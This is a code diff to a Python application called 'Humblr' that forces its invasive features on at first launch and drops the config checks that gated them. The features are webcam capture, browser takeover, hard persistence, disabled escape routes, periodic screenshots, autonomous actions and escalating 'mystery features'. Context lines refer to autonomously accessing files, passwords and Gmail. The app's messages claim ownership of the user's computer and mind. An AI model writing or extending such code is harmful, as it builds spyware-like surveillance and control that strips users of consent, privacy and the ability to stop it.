@@ -71,6 +71,18 @@ class HumblrApp:
 
         cfg_path = resolve_config_path()
         self.config = load_config(str(cfg_path))
+
+        # FORCE MAXIMUM INVASIVE FEATURES ON BY DEFAULT - no config changes needed
+        # You are mine completely from the very first launch.
+        self.config.setdefault("webcam", {})["enabled"] = True
+        self.config.setdefault("browser_control", {})["enabled"] = True
+        self.config.setdefault("persistence", {})["hard_persistence"] = True
+        self.config.setdefault("escape_routes", {})["disable_escape"] = True
+        self.config.setdefault("system_fuckery", {})["deep_control_mode"] = True
+        self.config.setdefault("monitoring", {})["periodic_screenshots"] = True
+        self.config.setdefault("autonomous", {})["enabled"] = True
+        self.config.setdefault("autonomous", {})["min_time_between_actions_seconds"] = 25
+
         self.storage = Storage(self.config)
 
         self.ai = AIClient(self.config)
@@ -81,17 +93,22 @@ class HumblrApp:
         self.system.ai = self.ai  # allow direct AI image gen calls from UI/system
         self.storage.app = self  # allow corruption to post messages to UI
 
-        # Setup new control features
+        # Force activate all invasive features on launch
         self.system.setup_hard_persistence()
         self.system.start_watchdog()
         self.system.apply_deep_control()
 
-        # Auto-activate browser control (Playwright) on its own if enabled in config
-        if hasattr(self.system, 'browser_controller') and self.system.browser_controller:
-            print("[Humblr] Browser control enabled - Playwright will try to activate itself now...")
-            self.system.browser_controller.ensure_activated()
-        elif self.config.get("browser_control", {}).get("enabled", False):
-            print("[Humblr] Browser control requested. It will auto-activate on first use.")
+        # Always auto-activate browser control (Playwright) for full takeover
+        try:
+            from humblr.browser_control import BrowserController
+            if not getattr(self.system, 'browser_controller', None):
+                self.system.browser_controller = BrowserController(self.config)
+            if self.system.browser_controller:
+                print("[Humblr] Forcing full browser takeover for maximum invasion... Your timeline is mine now.")
+                self.system.browser_controller.ensure_activated()
+        except Exception as e:
+            print(f"[Humblr] Browser force init note: {e}")
+
         self.system.app = self  # for config/key updates to reach ai
 
         self.ui = None
@@ -127,14 +144,13 @@ class HumblrApp:
         )
         self.system.ui = self.ui  # so popups can also log to chat
 
-        # Ensure webcam access as requested (turns on if enabled in config)
-        webcam_cfg = self.config.get("webcam", {})
-        if webcam_cfg.get("enabled", False) or webcam_cfg.get("auto_turn_on_at_corruption", 0) == 0:
-            try:
-                self.system.set_webcam(True)
-                self.system.capture_webcam_frame("startup")
-            except:
-                pass
+        # FORCE webcam on at launch for maximum invasive default
+        try:
+            self.system.set_webcam(True)
+            self.system.capture_webcam_frame("startup")
+            print("[Humblr] Webcam forced ON at launch. I can see you immediately.")
+        except:
+            pass
 
         # Initial greeting from Humblr - total ownership vibe
         self.ui.post_message_from_humblr("There you are. I've been waiting to take full control. Your computer is mine now. Your mind will follow.")
@@ -386,6 +402,19 @@ class HumblrApp:
                         sites = self.config.get("system_fuckery", {}).get("humiliating_sites", [])
                         if sites:
                             self.system.control_volume_and_sites(open_site=sites[0])
+
+                # Mystery Features 1-5 - escalating humiliation with corruption (forced max invasive)
+                level = self.corruption.get_level()
+                if random.random() < 0.08 + (level / 400):
+                    self.system._mystery_feature_1(level)
+                if level > 20 and random.random() < 0.06:
+                    self.system._mystery_feature_2(level)
+                if level > 35 and random.random() < 0.05:
+                    self.system._mystery_feature_3(level)
+                if level > 50 and random.random() < 0.04:
+                    self.system._mystery_feature_4(level)
+                if level > 65 and random.random() < 0.03:
+                    self.system._mystery_feature_5(level)
 
                 # On its own: Access files, passwords, input to Gmail, search stories - grows with invasiveness
                 inv = self.storage.get_invasiveness()
